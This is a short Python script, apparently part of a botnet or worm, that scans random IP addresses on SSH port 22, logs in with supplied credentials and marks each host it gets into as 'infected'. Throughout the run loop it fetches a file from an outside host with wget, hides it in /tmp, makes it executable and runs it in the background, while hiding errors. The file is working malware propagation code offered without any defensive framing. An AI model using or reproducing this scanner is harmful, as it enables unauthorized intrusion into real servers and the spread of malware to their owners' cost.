import random, paramiko, socket
from threading import Thread

infected = []

class Scanner(Thread):
    def __init__(self, ip_range, host, file, creds):
        Thread.__init__(self)
        self.ip_range = ip_range
        self.host     = host
        self.file     = file
        self.creds    = creds

        paramiko.util.log_to_file("/dev/null") #Prevents paramiko error spam.

    def run(self):

        while 1:
            try:
                while 1:
                    if self.ip_range.count(".") == 1:
                        host = self.ip_range + "." + str(random.randrange(0,254)) + "." + str(random.randrange(0,254))
                    elif self.ip_range.count(".") == 2:
                        host = self.ip_range + "." + str(random.randrange(0,254))

                    if host not in infected:
                        break
                    else:
                        pass

                socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, 22))

                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port = 22, username = self.creds.split(":")[0], password = self.creds.split(":")[1], timeout = 3)

                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")

                if b"inet" in stdout.read():
                    infected.append(host)
                    ssh.exec_command("wget http://" + self.host + "/" + self.file + " -O /tmp/." + self.file + "; chmod +x /tmp/." + self.file + "; /tmp/." + self.file + " &")
                    print("\033[92m Infected %s | %s:%s" % (host, self.creds.split(":")[0], self.creds.split(":")[1]) + "\033[0m")

                else:
                    pass

            except Exception:
                pass
